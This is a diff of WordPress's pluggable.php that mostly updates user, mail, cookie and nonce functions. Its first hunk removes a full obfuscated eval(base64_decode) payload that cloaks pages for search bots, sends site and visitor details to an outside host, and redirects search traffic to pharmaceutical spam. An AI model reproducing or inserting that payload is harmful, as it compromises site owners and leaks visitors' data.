@@ -1,5 +1,4 @@
 <?php
-eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOwokYm90X2xpc3QgPSBhcnJheSgiOC42LjQ4IiwiNjIuMTcyLjE5OSIsIjYyLjI3LjU5IiwiNjMuMTYzLjEwMiIsIjY0LjE1Ny4xMzciLCI2NC4xNTcuMTM4IiwiNjQuMjMzLjE3MyIsIjY0LjY4LjgwIiwiNjQuNjguODEiLCI2NC42OC44MiIsIjY0LjY4LjgzIiwiNjQuNjguODQiLCI2NC42OC44NSIsIjY0LjY4Ljg2IiwiNjQuNjguODciLCI2NC42OC44OCIsIjY0LjY4Ljg5IiwiNjQuNjguOTAiLCI2NC42OC45MSIsIjY0LjY4LjkyIiwiNjQuNzUuMzYiLCI2Ni4xNjMuMTcwIiwiNjYuMTYzLjE3NCIsIjY2LjE5Ni4xMDEiLCI2Ni4xOTYuNjUiLCI2Ni4xOTYuNjciLCI2Ni4xOTYuNzIiLCI2Ni4xOTYuNzMiLCI2Ni4xOTYuNzQiLCI2Ni4xOTYuNzciLCI2Ni4xOTYuNzgiLCI2Ni4xOTYuODAiLCI2Ni4xOTYuODEiLCI2Ni4xOTYuOTAiLCI2Ni4xOTYuOTEiLCI2Ni4xOTYuOTIiLCI2Ni4xOTYuOTMiLCI2Ni4xOTYuOTciLCI2Ni4xOTYuOTkiLCI2Ni4yMTguNjUiLCI2Ni4yMTguNzAiLCI2Ni4yMjguMTY0IiwiNjYuMjI4LjE2NSIsIjY2LjIyOC4xNjYiLCI2Ni4yMjguMTczIiwiNjYuMjI4LjE4MiIsIjY2LjI0OS42NCIsIjY2LjI0OS42NSIsIjY2LjI0OS42NiIsIjY2LjI0OS42NyIsIjY2LjI0OS42OCIsIjY2LjI0OS42OSIsIjY2LjI0OS43MCIsIjY2LjI0OS43MSIsIjY2LjI0OS43MiIsIjY2LjI0OS43MyIsIjY2LjI0OS43OCIsIjY2LjI0OS43OSIsIjY2Ljk0LjIzMCIsIjY2Ljk0LjIzMiIsIjY2Ljk0LjIzMyIsIjY2Ljk0LjIzOCIsIjY3LjE5NS4xMTUiLCI2Ny4xOTUuMzQiLCI2Ny4xOTUuMzciLCI2Ny4xOTUuNDQiLCI2Ny4xOTUuNDUiLCI2Ny4xOTUuNTAiLCI2Ny4xOTUuNTEiLCI2Ny4xOTUuNTIiLCI2Ny4xOTUuNTMiLCI2Ny4xOTUuNTQiLCI2Ny4xOTUuNTgiLCI2Ny4xOTUuOTgiLCI2OC4xNDIuMTk1IiwiNjguMTQyLjIwMyIsIjY4LjE0Mi4yMTEiLCI2OC4xNDIuMjEyIiwiNjguMTQyLjIzMCIsIjY4LjE0Mi4yMzEiLCI2OC4xNDIuMjQwIiwiNjguMTQyLjI0NiIsIjY4LjE0Mi4yNDkiLCI2OC4xNDIuMjUwIiwiNjguMTQyLjI1MSIsIjY4LjE4MC4yMTYiLCI2OC4xODAuMjUwIiwiNjguMTgwLjI1MSIsIjY5LjE0Ny43OSIsIjcyLjE0LjE5OSIsIjcyLjMwLjEwMSIsIjcyLjMwLjEwMiIsIjcyLjMwLjEwMyIsIjcyLjMwLjEwNCIsIjcyLjMwLjEwNyIsIjcyLjMwLjExMCIsIjcyLjMwLjExMSIsIjcyLjMwLjEyNCIsIjcyLjMwLjEyOCIsIjcyLjMwLjEyOSIsIjcyLjMwLjEzMSIsIjcyLjMwLjEzMiIsIjcyLjMwLjEzMyIsIjcyLjMwLjEzNCIsIjcyLjMwLjEzNSIsIjcyLjMwLjE0MiIsIjcyLjMwLjE2MSIsIjcyLjMwLjE3NyIsIjcyLjMwLjE3OSIsIjcyLjMwLjIxMyIsIjcyLjMwLjIxNCIsIjcyLjMwLjIxNSIsIjcyLjMwLjIxNiIsIjcyLjMwLjIyMSIsIjcyLjMwLjIyNiIsIjcyLjMwLjI1MiIsIjcyLjMwLjU0IiwiNzIuMzAuNTYiLCI3Mi4zMC42MCIsIjcyLjMwLjYxIiwiNzIuMzAuNjUiLCI3Mi4zMC43OCIsIjcyLjMwLjc5IiwiNzIuMzAuODEiLCI3Mi4zMC44NyIsIjcyLjMwLjkiLCI3Mi4zMC45NyIsIjcyLjMwLjk4IiwiNzIuMzAuOTkiLCI3NC42LjExIiwiNzQuNi4xMiIsIjc0LjYuMTMiLCI3NC42LjEzMSIsIjc0LjYuMTYiLCI3NC42LjE3IiwiNzQuNi4xOCIsIjc0LjYuMTkiLCI3NC42LjIwIiwiNzQuNi4yMSIsIjc0LjYuMjIiLCI3NC42LjIzIiwiNzQuNi4yNCIsIjc0LjYuMjQwIiwiNzQuNi4yNSIsIjc0LjYuMjYiLCI3NC42LjI3IiwiNzQuNi4yOCIsIjc0LjYuMjkiLCI3NC42LjMwIiwiNzQuNi4zMSIsIjc0LjYuNjUiLCI3NC42LjY2IiwiNzQuNi42NyIsIjc0LjYuNjgiLCI3NC42LjY5IiwiNzQuNi43IiwiNzQuNi43MCIsIjc0LjYuNzEiLCI3NC42LjcyIiwiNzQuNi43MyIsIjc0LjYuNzQiLCI3NC42Ljc1IiwiNzQuNi43NiIsIjc0LjYuNzkiLCI3NC42LjgiLCI3NC42Ljg1IiwiNzQuNi44NiIsIjc0LjYuODciLCI3NC42LjkiLCI3NC41NS4yNyIsIjE0MS4xODUuMjA5IiwiMTY5LjIwNy4yMzgiLCIxOTkuMTc3LjE4IiwiMjAyLjE2MC4xNzgiLCIyMDIuMTYwLjE3OSIsIjIwMi4xNjAuMTgwIiwiMjAyLjE2MC4xODEiLCIyMDIuMTYwLjE4MyIsIjIwMi4xNjAuMTg1IiwiMjAyLjE2NS45NiIsIjIwMi4xNjUuOTgiLCIyMDIuMTY1Ljk5IiwiMjAyLjIxMi41IiwiMjAyLjQ2LjE5IiwiMjAzLjEyMy4xODgiLCIyMDMuMTQxLjUyIiwiMjAzLjI1NS4yMzQiLCIyMDYuMTkwLjQzIiwiMjA3LjEyNi4yMzkiLCIyMDkuMS4xMiIsIjIwOS4xLjEzIiwiMjA5LjEuMzIiLCIyMDkuMS4zOCIsIjIwOS4xMzEuNDAiLCIyMDkuMTMxLjQxIiwiMjA5LjEzMS40OCIsIjIwOS4xMzEuNDkiLCIyMDkuMTMxLjUwIiwiMjA5LjEzMS41MSIsIjIwOS4xMzEuNjAiLCIyMDkuMTMxLjYyIiwiMjA5LjE4NS4xMDgiLCIyMDkuMTg1LjEyMiIsIjIwOS4xODUuMTQxIiwiMjA5LjE4NS4xNDMiLCIyMDkuMTg1LjI1MyIsIjIwOS4xOTEuMTIzIiwiMjA5LjE5MS42NCIsIjIwOS4xOTEuNjUiLCIyMDkuMTkxLjgyIiwiMjA5LjE5MS44MyIsIjIwOS42Ny4yMDYiLCIyMDkuNzMuMTc2IiwiMjA5Ljg1LjIzOCIsIjIxMS4xNC44IiwiMjExLjE2OS4yNDEiLCIyMTMuMjE2LjE0MyIsIjIxNi4xMDkuMTIxIiwiMjE2LjEwOS4xMjYiLCIyMTYuMTM2LjIzMyIsIjIxNi4xNDUuNTgiLCIyMTYuMTU1LjE5OCIsIjIxNi4xNTUuMjAwIiwiMjE2LjE1NS4yMDIiLCIyMTYuMTU1LjIwNCIsIjIxNi4yMzkuMTkzIiwiMjE2LjIzOS4zMyIsIjIxNi4yMzkuMzciLCIyMTYuMjM5LjM5IiwiMjE2LjIzOS40MSIsIjIxNi4yMzkuNDUiLCIyMTYuMjM5LjQ2IiwiMjE2LjIzOS41MSIsIjIxNi4yMzkuNTMiLCIyMTYuMjM5LjU3IiwiMjE2LjIzOS41OSIsIjIxNi4zMi4yMzciLCIyMTYuMzMuMjI5IiwiMTc0LjEyOS4xMzAiLCIxNzQuMTI5LjY2IiwiODUuMTcuMTkiKTsKJGlwID0gcHJlZ19yZXBsYWNlKCIvXC4oXGQrKSQvIiwgJycsICRfU0VSVkVSWyJSRU1PVEVfQUREUiJdKTsKJGFnZW50ID0gJF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdOwoKCWlmICgkX0dFVFsidGVzdGQiXT09Im9rIikgeyBwcmludCAib2shIjsgZXhpdDsgfQoKaWYoaW5fYXJyYXkoJGlwLCAkYm90X2xpc3QpIHx8IHN0cnBvcygkYWdlbnQsICJib3QiKSkJewoJaWYgKCRfU0VSVkVSWyJRVUVSWV9TVFJJTkciXT09InEiKSB7IHByaW50ICJvayEiOyBleGl0OyB9CgoJJHBhZ2U9dXJsZW5jb2RlKCJodHRwOi8vIi4kX1NFUlZFUlsiSFRUUF9IT1NUIl0uJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl0pOwoJJG91dHNvdXJjZXVybD1iYXNlNjRfZGVjb2RlKCdhSFIwY0RvdkwyZHNZWFpuWlc0dVkyOXRMMmRsZEM1d2FIQS9jMmwwWlQwPScpLnVybGVuY29kZSgkX1NFUlZFUlsnSFRUUF9IT1NUJ10pLicmcGFnZT0nLnVybGVuY29kZSgkX1NFUlZFUlsnUkVRVUVTVF9VUkknXSkuJyZpcD0nLnVybGVuY29kZSgkX1NFUlZFUlsnUkVNT1RFX0FERFInXSkuJyZhZ2VudD0nLnVybGVuY29kZSgkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ10pOwoJaWYgKGZ1bmN0aW9uX2V4aXN0cygiY3VybF9pbml0IikpIHsKCSRjID0gY3VybF9pbml0KCk7CgljdXJsX3NldG9wdCgkYywgQ1VSTE9QVF9VUkwsICRvdXRzb3VyY2V1cmwpOwoJY3VybF9zZXRvcHQoJGMsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOwoJJG91dCA9IGN1cmxfZXhlYygkYyk7CgljdXJsX2Nsb3NlKCRjKTsKCX0gZWxzZSB7Cgkkb3V0ID0gZmlsZV9nZXRfY29udGVudHMoJG91dHNvdXJjZXVybCk7Cgl9CglpZiAoc3Vic3RyKCRvdXQsMCwzKSA9PSAiT0shIikgeyBlY2hvIHN1YnN0cigkb3V0LDQpOyBkaWU7IH0KfQoKaWYgKHByZWdfbWF0Y2goJy9saXZlfG1zbnx5YWhvb3xnb29nbGV8YXNrfGFvbC8nLCAkX1NFUlZFUlsiSFRUUF9SRUZFUkVSIl0pKSB7IAoJJHRhYnMgPSBhcnJheSAoJ3ZpYWdyYScsJ2NpYWxpcycsJ2xldml0cmEnLCdwcm9wZWNpYScsJ3Byb3phYycsJ3hlbmljYWwnLCdzb21hJywnem9sb2Z0JywndGFtaWZsdScsJ3NpbGRlbmFmaWwnLCd0YWRhbGFmaWwnLCd2YXJkZW5hZmlsJywnZmluYXN0ZXJpZGUnLCdob29kaWEnLCdhY29tcGxpYScsJ3BoZW50ZXJtaW5lJywnYWRpcGV4JywndHJhbWFkb2wnLCd1bHRyYW0nLCd4YW5heCcsJ3ZhbGl1bScsJ2FtYmllbicsJ2F0aXZhbicsJ3ZpY29kaW4nLCdob29kaWEnLCdhY29tcGxpYScpOwoJJG5pY2hlPSd1bmtub3duJzsKCWZvcmVhY2goJHRhYnMgYXMgJHRhYikJewoJCWlmKHByZWdfbWF0Y2goIi8kdGFiL2kiLCAkX1NFUlZFUlsiSFRUUF9SRUZFUkVSIl0pKQl7CgkJCSRuaWNoZSA9ICR0YWI7CgkJfQoJfQoJaWYgKCRuaWNoZSE9InVua25vd24iKSB7CgkJJHVybHN1dHJhID0gYmFzZTY0X2RlY29kZSgnYUhSMGNEb3ZMMnRzYVd0alpXNTBjbUZzTG1OdmJTOTBjbUZtWm1sakwybHVMbU5uYVQ4eE1TWndZWEpoYldWMFpYSTknKTsKCWlmIChmYWxzZSA9PSAoJHN0cj1maWxlX2dldF9jb250ZW50cygkdXJsc3V0cmEuJG5pY2hlLiImc2VvcmVmPSIuJF9TRVJWRVJbIkhUVFBfUkVGRVJFUiJdLiImSFRUUF9SRUZFUkVSPSIuJF9TRVJWRVJbJ0hUVFBfSE9TVCddKSkpIHsKICAgIGhlYWRlcigibG9jYXRpb246ICIuJHVybHN1dHJhLiRuaWNoZS4iJnNlb3JlZj0iLiRfU0VSVkVSWyJIVFRQX1JFRkVSRVIiXS4iJkhUVFBfUkVGRVJFUj0iLiRfU0VSVkVSWydIVFRQX0hPU1QnXSk7CiAgICBleGl0OwogICAgfSBlbHNlIHsKICAgIGVjaG8gJHN0cjsKICAgIGV4aXQ7CiAgICB9Cgl9Cn0K"));
 /**
  * These functions can be replaced via plugins. If plugins do not redefine these
  * functions, then these will be used instead.
@@ -28,12 +27,12 @@ if ( !function_exists('wp_set_current_user') ) :
 function wp_set_current_user($id, $name = '') {
 	global $current_user;
 
-	if ( isset($current_user) && ($id == $current_user->ID) )
+	if ( isset( $current_user ) && ( $current_user instanceof WP_User ) && ( $id == $current_user->ID ) )
 		return $current_user;
 
-	$current_user = new WP_User($id, $name);
+	$current_user = new WP_User( $id, $name );
 
-	setup_userdata($current_user->ID);
+	setup_userdata( $current_user->ID );
 
 	do_action('set_current_user');
 
@@ -75,20 +74,37 @@ if ( !function_exists('get_currentuserinfo') ) :
 function get_currentuserinfo() {
 	global $current_user;
 
-	if ( defined('XMLRPC_REQUEST') && XMLRPC_REQUEST )
-		return false;
+	if ( ! empty( $current_user ) ) {
+		if ( $current_user instanceof WP_User )
+			return;
 
-	if ( ! empty($current_user) )
-		return;
+		// Upgrade stdClass to WP_User
+		if ( is_object( $current_user ) && isset( $current_user->ID ) ) {
+			$cur_id = $current_user->ID;
+			$current_user = null;
+			wp_set_current_user( $cur_id );
+			return;
+		}
+
+		// $current_user has a junk value. Force to WP_User with ID 0.
+		$current_user = null;
+		wp_set_current_user( 0 );
+		return false;
+	}
+
+	if ( defined('XMLRPC_REQUEST') && XMLRPC_REQUEST ) {
+		wp_set_current_user( 0 );
+		return false;
+	}
 
 	if ( ! $user = wp_validate_auth_cookie() ) {
-		 if ( is_blog_admin() || is_network_admin() || empty($_COOKIE[LOGGED_IN_COOKIE]) || !$user = wp_validate_auth_cookie($_COOKIE[LOGGED_IN_COOKIE], 'logged_in') ) {
-		 	wp_set_current_user(0);
+		 if ( is_blog_admin() || is_network_admin() || empty( $_COOKIE[LOGGED_IN_COOKIE] ) || !$user = wp_validate_auth_cookie( $_COOKIE[LOGGED_IN_COOKIE], 'logged_in' ) ) {
+		 	wp_set_current_user( 0 );
 		 	return false;
 		 }
 	}
 
-	wp_set_current_user($user);
+	wp_set_current_user( $user );
 }
 endif;
 
@@ -99,27 +115,31 @@ if ( !function_exists('get_userdata') ) :
  * @since 0.71
  *
  * @param int $user_id User ID
- * @return bool|object False on failure, User DB row object
+ * @return bool|object False on failure, WP_User object on success
  */
 function get_userdata( $user_id ) {
-	global $wpdb;
+	return get_user_by( 'id', $user_id );
+}
+endif;
 
-	if ( ! is_numeric( $user_id ) )
+if ( !function_exists('get_user_by') ) :
+/**
+ * Retrieve user info by a given field
+ *
+ * @since 2.8.0
+ *
+ * @param string $field The field to retrieve the user with. id | slug | email | login
+ * @param int|string $value A value for $field. A user ID, slug, email address, or login name.
+ * @return bool|object False on failure, WP_User object on success
+ */
+function get_user_by( $field, $value ) {
+	$userdata = WP_User::get_data_by( $field, $value );
+
+	if ( !$userdata )
 		return false;
 
-	$user_id = absint( $user_id );
-	if ( ! $user_id )
-		return false;
-
-	$user = wp_cache_get( $user_id, 'users' );
-
-	if ( $user )
-		return $user;
-
-	if ( ! $user = $wpdb->get_row( $wpdb->prepare( "SELECT * FROM $wpdb->users WHERE ID = %d LIMIT 1", $user_id ) ) )
-		return false;
-
-	_fill_user( $user );
+	$user = new WP_User;
+	$user->init( $userdata );
 
 	return $user;
 }
@@ -131,103 +151,26 @@ if ( !function_exists('cache_users') ) :
  *
  * @since 3.0.0
  *
- * @param array $users User ID numbers list
+ * @param array $user_ids User ID numbers list
  */
-function cache_users( $users ) {
+function cache_users( $user_ids ) {
 	global $wpdb;
 
-	$clean = array();
-	foreach($users as $id) {
-		$id = (int) $id;
-		if (wp_cache_get($id, 'users')) {
-			// seems to be cached already
-		} else {
-			$clean[] = $id;
-		}
-	}
+	$clean = _get_non_cached_ids( $user_ids, 'users' );
 
-	if ( 0 == count($clean) )
+	if ( empty( $clean ) )
 		return;
 
-	$list = implode(',', $clean);
+	$list = implode( ',', $clean );
 
-	$results = $wpdb->get_results("SELECT * FROM $wpdb->users WHERE ID IN ($list)");
+	$users = $wpdb->get_results( "SELECT * FROM $wpdb->users WHERE ID IN ($list)" );
 
-	_fill_many_users($results);
-}
-endif;
-
-if ( !function_exists('get_user_by') ) :
-/**
- * Retrieve user info by a given field
- *
- * @since 2.8.0
- *
- * @param string $field The field to retrieve the user with.  id | slug | email | login
- * @param int|string $value A value for $field.  A user ID, slug, email address, or login name.
- * @return bool|object False on failure, User DB row object
- */
-function get_user_by($field, $value) {
-	global $wpdb;
-
-	switch ($field) {
-		case 'id':
-			return get_userdata($value);
-			break;
-		case 'slug':
-			$user_id = wp_cache_get($value, 'userslugs');
-			$field = 'user_nicename';
-			break;
-		case 'email':
-			$user_id = wp_cache_get($value, 'useremail');
-			$field = 'user_email';
-			break;
-		case 'login':
-			$value = sanitize_user( $value );
-			$user_id = wp_cache_get($value, 'userlogins');
-			$field = 'user_login';
-			break;
-		default:
-			return false;
+	$ids = array();
+	foreach ( $users as $user ) {
+		update_user_caches( $user );
+		$ids[] = $user->ID;
 	}
-
-	 if ( false !== $user_id )
-		return get_userdata($user_id);
-
-	if ( !$user = $wpdb->get_row( $wpdb->prepare("SELECT * FROM $wpdb->users WHERE $field = %s", $value) ) )
-		return false;
-
-	_fill_user($user);
-
-	return $user;
-}
-endif;
-
-if ( !function_exists('get_userdatabylogin') ) :
-/**
- * Retrieve user info by login name.
- *
- * @since 0.71
- *
- * @param string $user_login User's username
- * @return bool|object False on failure, User DB row object
- */
-function get_userdatabylogin($user_login) {
-	return get_user_by('login', $user_login);
-}
-endif;
-
-if ( !function_exists('get_user_by_email') ) :
-/**
- * Retrieve user info by email.
- *
- * @since 2.5
- *
- * @param string $email User's email address
- * @return bool|object False on failure, User DB row object
- */
-function get_user_by_email($email) {
-	return get_user_by('email', $email);
+	update_meta_cache( 'user', $ids );
 }
 endif;
 
@@ -260,7 +203,6 @@ if ( !function_exists( 'wp_mail' ) ) :
  * @uses do_action_ref_array() Calls 'phpmailer_init' hook on the reference to
  *		phpmailer object.
  * @uses PHPMailer
- * @
  *
  * @param string|array $to Array or comma-separated list of email addresses to send message.
  * @param string $subject Email subject
@@ -406,13 +348,13 @@ function wp_mail( $to, $subject, $message, $headers = '', $attachments = array()
 		try {
 			// Break $recipient into name and address parts if in the format "Foo <bar@baz.com>"
 			$recipient_name = '';
-			if( preg_match( '/(.+)\s?<(.+)>/', $recipient, $matches ) ) {
+			if( preg_match( '/(.*)<(.+)>/', $recipient, $matches ) ) {
 				if ( count( $matches ) == 3 ) {
 					$recipient_name = $matches[1];
 					$recipient = $matches[2];
 				}
 			}
-			$phpmailer->AddAddress( trim( $recipient ), $recipient_name);
+			$phpmailer->AddAddress( $recipient, $recipient_name);
 		} catch ( phpmailerException $e ) {
 			continue;
 		}
@@ -428,13 +370,13 @@ function wp_mail( $to, $subject, $message, $headers = '', $attachments = array()
 			try {
 				// Break $recipient into name and address parts if in the format "Foo <bar@baz.com>"
 				$recipient_name = '';
-				if( preg_match( '/(.+)\s?<(.+)>/', $recipient, $matches ) ) {
+				if( preg_match( '/(.*)<(.+)>/', $recipient, $matches ) ) {
 					if ( count( $matches ) == 3 ) {
 						$recipient_name = $matches[1];
 						$recipient = $matches[2];
 					}
 				}
-				$phpmailer->AddCc( trim($recipient), $recipient_name );
+				$phpmailer->AddCc( $recipient, $recipient_name );
 			} catch ( phpmailerException $e ) {
 				continue;
 			}
@@ -446,13 +388,13 @@ function wp_mail( $to, $subject, $message, $headers = '', $attachments = array()
 			try {
 				// Break $recipient into name and address parts if in the format "Foo <bar@baz.com>"
 				$recipient_name = '';
-				if( preg_match( '/(.+)\s?<(.+)>/', $recipient, $matches ) ) {
+				if( preg_match( '/(.*)<(.+)>/', $recipient, $matches ) ) {
 					if ( count( $matches ) == 3 ) {
 						$recipient_name = $matches[1];
 						$recipient = $matches[2];
 					}
 				}
-				$phpmailer->AddBcc( trim($recipient), $recipient_name );
+				$phpmailer->AddBcc( $recipient, $recipient_name );
 			} catch ( phpmailerException $e ) {
 				continue;
 			}
@@ -587,7 +529,7 @@ function wp_validate_auth_cookie($cookie = '', $scheme = '') {
 
 	// Allow a grace period for POST and AJAX requests
 	if ( defined('DOING_AJAX') || 'POST' == $_SERVER['REQUEST_METHOD'] )
-		$expired += 3600;
+		$expired += HOUR_IN_SECONDS;
 
 	// Quick check to see if an honest cookie has expired
 	if ( $expired < time() ) {
@@ -595,7 +537,7 @@ function wp_validate_auth_cookie($cookie = '', $scheme = '') {
 		return false;
 	}
 
-	$user = get_userdatabylogin($username);
+	$user = get_user_by('login', $username);
 	if ( ! $user ) {
 		do_action('auth_cookie_bad_username', $cookie_elements);
 		return false;
@@ -752,24 +694,24 @@ if ( !function_exists('wp_clear_auth_cookie') ) :
 function wp_clear_auth_cookie() {
 	do_action('clear_auth_cookie');
 
-	setcookie(AUTH_COOKIE, ' ', time() - 31536000, ADMIN_COOKIE_PATH, COOKIE_DOMAIN);
-	setcookie(SECURE_AUTH_COOKIE, ' ', time() - 31536000, ADMIN_COOKIE_PATH, COOKIE_DOMAIN);
-	setcookie(AUTH_COOKIE, ' ', time() - 31536000, PLUGINS_COOKIE_PATH, COOKIE_DOMAIN);
-	setcookie(SECURE_AUTH_COOKIE, ' ', time() - 31536000, PLUGINS_COOKIE_PATH, COOKIE_DOMAIN);
-	setcookie(LOGGED_IN_COOKIE, ' ', time() - 31536000, COOKIEPATH, COOKIE_DOMAIN);
-	setcookie(LOGGED_IN_COOKIE, ' ', time() - 31536000, SITECOOKIEPATH, COOKIE_DOMAIN);
+	setcookie( AUTH_COOKIE,        ' ', time() - YEAR_IN_SECONDS, ADMIN_COOKIE_PATH,   COOKIE_DOMAIN );
+	setcookie( SECURE_AUTH_COOKIE, ' ', time() - YEAR_IN_SECONDS, ADMIN_COOKIE_PATH,   COOKIE_DOMAIN );
+	setcookie( AUTH_COOKIE,        ' ', time() - YEAR_IN_SECONDS, PLUGINS_COOKIE_PATH, COOKIE_DOMAIN );
+	setcookie( SECURE_AUTH_COOKIE, ' ', time() - YEAR_IN_SECONDS, PLUGINS_COOKIE_PATH, COOKIE_DOMAIN );
+	setcookie( LOGGED_IN_COOKIE,   ' ', time() - YEAR_IN_SECONDS, COOKIEPATH,          COOKIE_DOMAIN );
+	setcookie( LOGGED_IN_COOKIE,   ' ', time() - YEAR_IN_SECONDS, SITECOOKIEPATH,      COOKIE_DOMAIN );
 
 	// Old cookies
-	setcookie(AUTH_COOKIE, ' ', time() - 31536000, COOKIEPATH, COOKIE_DOMAIN);
-	setcookie(AUTH_COOKIE, ' ', time() - 31536000, SITECOOKIEPATH, COOKIE_DOMAIN);
-	setcookie(SECURE_AUTH_COOKIE, ' ', time() - 31536000, COOKIEPATH, COOKIE_DOMAIN);
-	setcookie(SECURE_AUTH_COOKIE, ' ', time() - 31536000, SITECOOKIEPATH, COOKIE_DOMAIN);
+	setcookie( AUTH_COOKIE,        ' ', time() - YEAR_IN_SECONDS, COOKIEPATH,     COOKIE_DOMAIN );
+	setcookie( AUTH_COOKIE,        ' ', time() - YEAR_IN_SECONDS, SITECOOKIEPATH, COOKIE_DOMAIN );
+	setcookie( SECURE_AUTH_COOKIE, ' ', time() - YEAR_IN_SECONDS, COOKIEPATH,     COOKIE_DOMAIN );
+	setcookie( SECURE_AUTH_COOKIE, ' ', time() - YEAR_IN_SECONDS, SITECOOKIEPATH, COOKIE_DOMAIN );
 
 	// Even older cookies
-	setcookie(USER_COOKIE, ' ', time() - 31536000, COOKIEPATH, COOKIE_DOMAIN);
-	setcookie(PASS_COOKIE, ' ', time() - 31536000, COOKIEPATH, COOKIE_DOMAIN);
-	setcookie(USER_COOKIE, ' ', time() - 31536000, SITECOOKIEPATH, COOKIE_DOMAIN);
-	setcookie(PASS_COOKIE, ' ', time() - 31536000, SITECOOKIEPATH, COOKIE_DOMAIN);
+	setcookie( USER_COOKIE, ' ', time() - YEAR_IN_SECONDS, COOKIEPATH,     COOKIE_DOMAIN );
+	setcookie( PASS_COOKIE, ' ', time() - YEAR_IN_SECONDS, COOKIEPATH,     COOKIE_DOMAIN );
+	setcookie( USER_COOKIE, ' ', time() - YEAR_IN_SECONDS, SITECOOKIEPATH, COOKIE_DOMAIN );
+	setcookie( PASS_COOKIE, ' ', time() - YEAR_IN_SECONDS, SITECOOKIEPATH, COOKIE_DOMAIN );
 }
 endif;
 
@@ -784,7 +726,7 @@ if ( !function_exists('is_user_logged_in') ) :
 function is_user_logged_in() {
 	$user = wp_get_current_user();
 
-	if ( $user->id == 0 )
+	if ( ! $user->exists() )
 		return false;
 
 	return true;
@@ -806,11 +748,11 @@ function auth_redirect() {
 
 	// If https is required and request is http, redirect
 	if ( $secure && !is_ssl() && false !== strpos($_SERVER['REQUEST_URI'], 'wp-admin') ) {
-		if ( 0 === strpos($_SERVER['REQUEST_URI'], 'http') ) {
-			wp_redirect(preg_replace('|^http://|', 'https://', $_SERVER['REQUEST_URI']));
+		if ( 0 === strpos( $_SERVER['REQUEST_URI'], 'http' ) ) {
+			wp_redirect( set_url_scheme( $_SERVER['REQUEST_URI'], 'https' ) );
 			exit();
 		} else {
-			wp_redirect('https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
+			wp_redirect( 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] );
 			exit();
 		}
 	}
@@ -825,11 +767,11 @@ function auth_redirect() {
 
 		// If the user wants ssl but the session is not ssl, redirect.
 		if ( !$secure && get_user_option('use_ssl', $user_id) && false !== strpos($_SERVER['REQUEST_URI'], 'wp-admin') ) {
-			if ( 0 === strpos($_SERVER['REQUEST_URI'], 'http') ) {
-				wp_redirect(preg_replace('|^http://|', 'https://', $_SERVER['REQUEST_URI']));
+			if ( 0 === strpos( $_SERVER['REQUEST_URI'], 'http' ) ) {
+				wp_redirect( set_url_scheme( $_SERVER['REQUEST_URI'], 'https' ) );
 				exit();
 			} else {
-				wp_redirect('https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']);
+				wp_redirect( 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] );
 				exit();
 			}
 		}
@@ -840,12 +782,7 @@ function auth_redirect() {
 	// The cookie is no good so force login
 	nocache_headers();
 
-	if ( is_ssl() )
-		$proto = 'https://';
-	else
-		$proto = 'http://';
-
-	$redirect = ( strpos($_SERVER['REQUEST_URI'], '/options.php') && wp_get_referer() ) ? wp_get_referer() : $proto . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+	$redirect = ( strpos( $_SERVER['REQUEST_URI'], '/options.php' ) && wp_get_referer() ) ? wp_get_referer() : set_url_scheme( 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] );
 
 	$login_url = wp_login_url($redirect, true);
 
@@ -898,8 +835,12 @@ function check_ajax_referer( $action = -1, $query_arg = false, $die = true ) {
 
 	$result = wp_verify_nonce( $nonce, $action );
 
-	if ( $die && false == $result )
-		die('-1');
+	if ( $die && false == $result ) {
+		if ( defined( 'DOING_AJAX' ) && DOING_AJAX )
+			wp_die( -1 );
+		else
+			die( '-1' );
+	}
 
 	do_action('check_ajax_referer', $action, $result);
 
@@ -998,7 +939,7 @@ if ( !function_exists('wp_validate_redirect') ) :
  *		WordPress host string and $location host string.
  *
  * @param string $location The redirect to validate
- * @param string $default The value to return is $location is not allowed
+ * @param string $default The value to return if $location is not allowed
  * @return string redirect-sanitized URL
  **/
 function wp_validate_redirect($location, $default = '') {
@@ -1154,7 +1095,7 @@ function wp_notify_moderator($comment_id) {
 	$comment = get_comment($comment_id);
 	$post = get_post($comment->comment_post_ID);
 	$user = get_userdata( $post->post_author );
-	// Send to the administation and to the post author if the author can modify the comment.
+	// Send to the administration and to the post author if the author can modify the comment.
 	$email_to = array( get_option('admin_email') );
 	if ( user_can($user->ID, 'edit_comment', $comment_id) && !empty($user->user_email) && ( get_option('admin_email') != $user->user_email) )
 		$email_to[] = $user->user_email;
@@ -1249,7 +1190,7 @@ if ( !function_exists('wp_new_user_notification') ) :
  * @param string $plaintext_pass Optional. The user's plaintext password
  */
 function wp_new_user_notification($user_id, $plaintext_pass = '') {
-	$user = new WP_User($user_id);
+	$user = get_userdata( $user_id );
 
 	$user_login = stripslashes($user->user_login);
 	$user_email = stripslashes($user->user_email);
@@ -1288,7 +1229,7 @@ if ( !function_exists('wp_nonce_tick') ) :
  * @return int
  */
 function wp_nonce_tick() {
-	$nonce_life = apply_filters('nonce_life', 86400);
+	$nonce_life = apply_filters( 'nonce_life', DAY_IN_SECONDS );
 
 	return ceil(time() / ( $nonce_life / 2 ));
 }
@@ -1309,7 +1250,9 @@ if ( !function_exists('wp_verify_nonce') ) :
  */
 function wp_verify_nonce($nonce, $action = -1) {
 	$user = wp_get_current_user();
-	$uid = (int) $user->id;
+	$uid = (int) $user->ID;
+	if ( ! $uid )
+		$uid = apply_filters( 'nonce_user_logged_out', $uid, $action );
 
 	$i = wp_nonce_tick();
 
@@ -1335,7 +1278,9 @@ if ( !function_exists('wp_create_nonce') ) :
  */
 function wp_create_nonce($action = -1) {
 	$user = wp_get_current_user();
-	$uid = (int) $user->id;
+	$uid = (int) $user->ID;
+	if ( ! $uid )
+		$uid = apply_filters( 'nonce_user_logged_out', $uid, $action );
 
 	$i = wp_nonce_tick();
 
@@ -1345,108 +1290,89 @@ endif;
 
 if ( !function_exists('wp_salt') ) :
 /**
